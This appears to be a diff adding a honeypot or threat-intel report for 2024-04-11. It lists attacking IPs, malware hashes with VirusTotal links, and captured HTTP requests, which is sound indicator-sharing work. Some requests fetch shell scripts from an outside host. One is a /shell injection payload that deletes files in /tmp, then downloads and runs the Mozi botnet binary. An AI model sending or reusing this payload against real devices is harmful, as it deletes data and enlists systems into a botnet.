@@ -1,0 +1,60 @@
+Top 5 IPs for 2024-04-11 :
+
+123.56.88.98
+82.50.166.80
+221.118.82.181
+112.248.105.66
+77.239.218.59
+
+Malware Download:
+
+def8a9c6142d7a5a0f4b02273b5a780da95d7717c8168021ac81b6f14d8e528e
+https://www.virustotal.com/gui/file/def8a9c6142d7a5a0f4b02273b5a780da95d7717c8168021ac81b6f14d8e528e
+2cc3a7bbfb287370350b494d3cf97bcf7ca212c88e62f456d235b046836c40a3
+https://www.virustotal.com/gui/file/2cc3a7bbfb287370350b494d3cf97bcf7ca212c88e62f456d235b046836c40a3
+c5c24a19759ea0257f1b8bbfde9a3e73bb4960618e0de4dc988ee2f3b505a8f1
+https://www.virustotal.com/gui/file/c5c24a19759ea0257f1b8bbfde9a3e73bb4960618e0de4dc988ee2f3b505a8f1
+d73ebb53137aa8c0fd22846ec6f30f76fbc797060f035ba146afa8c1e54805f9
+https://www.virustotal.com/gui/file/d73ebb53137aa8c0fd22846ec6f30f76fbc797060f035ba146afa8c1e54805f9
+26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b
+https://www.virustotal.com/gui/file/7a656791b445fff02ac6e9dd1081cc265db935476a9ee71139cb6aef52102e2b
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+21c4f409d11f26438c627df28c75e7c0a229724da9388817e9bbe6ca6df1fa66
+https://www.virustotal.com/gui/file/21c4f409d11f26438c627df28c75e7c0a229724da9388817e9bbe6ca6df1fa66
+bb85aeb341a56aedfc98e3b111faf0e8997f8191cc8e0556006c40661afc591c
+https://www.virustotal.com/gui/file/bb85aeb341a56aedfc98e3b111faf0e8997f8191cc8e0556006c40661afc591c
+
+
+Malcious Commands seen:
+
+GET /w.sh HTTP/1.1
+Host: 14.225.213.124
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /c.sh HTTP/1.1
+Host: 14.225.213.124
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+GET /wget.sh HTTP/1.1
+Host: 14.225.213.124
+User-Agent: curl/7.73.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+
+
+GET /shell?cd+/tmp;rm+-rf+*;wget+http://178.141.230.43:46009/Mozi.7;chmod+777+Mozi.7;/tmp/Mozi.7+jaws HTTP/1.1
+User-Agent: Hello, world
+Host: HOST IP
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+
